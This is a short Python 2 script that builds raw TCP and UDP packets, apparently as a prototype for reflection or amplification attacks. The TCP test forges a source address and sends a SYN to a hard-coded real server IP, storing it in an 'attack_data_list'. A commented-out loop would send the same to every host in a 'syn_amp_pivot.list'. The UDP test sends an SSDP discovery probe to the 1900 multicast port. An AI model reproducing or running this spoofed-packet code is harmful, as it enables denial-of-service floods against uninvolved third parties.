#coding: utf-8

import socket
import traceback

import rawsocket
import helper
import udp_data


def tcp_test(sock):
    dip = socket.gethostbyname("baidu.com")
    dip = "111.206.60.115"
    dport = 80
    try:
        T = rawsocket.TcpParser()
        T.sip = '111.206.60.114'
        T.sport = 15534
        T.dip = dip
        T.dport = dport
        T.tcp_syn = 1
        T.user_data = "test"
        d = T.packet()
        print "%s:%s\t->\t%s:%s\t%s\t%s"%(T.sip, T.sport, T.dip, T.dport, len(d), repr(d))

        attack_data_list = []
        attack_data_list.append(d)
        #for host in open('syn_amp_pivot.list').readlines():
        #    dip = host.strip()
        #    for dport in [80, 443]:
        #        T.dip = dip
        #        T.dport = dport
        #        d = T.packet()
        #        attack_data_list.append(d)
        #        print "%s:%s\t->\t%s:%s\t%s"%(T.sip, T.sport, T.dip, T.dport, len(T.user_data))
        for i in range(1):
            for d in attack_data_list:
                print "Send: %s"%sock.sendto(d, (dip, dport))
    except Exception, e:
        print traceback.format_exc()


def udp_test(sock):
    dip = socket.gethostbyname(socket.gethostname())
    dport = 25534
    dip = "239.255.255.250"
    dport = 1900
    try:
        U = rawsocket.UdpParser()
        U.sip = '1.1.1.1'
        U.sip = socket.gethostbyname(socket.gethostname())
        U.sport = 25534
        U.dip = dip
        U.dport = dport
        U.user_data = helper.reform_from_tcpdump(udp_data.ssdp_discovery)
        d = U.packet()
        #print repr(d[:28])
        #print repr(d[28:])
        print "%s:%s\t->\t%s:%s\t%s\t%s"%(U.sip, U.sport, U.dip, U.dport, len(d), repr(d))
        print "Send: %s"%sock.sendto(d, (dip, dport))
    except Exception, e:
        print traceback.format_exc()


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    # tell kernel not to put in headers, since we are providing it, when using IPPROTO_RAW this is not necessary
    #sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    #tcp_test(sock)
    udp_test(sock)
 

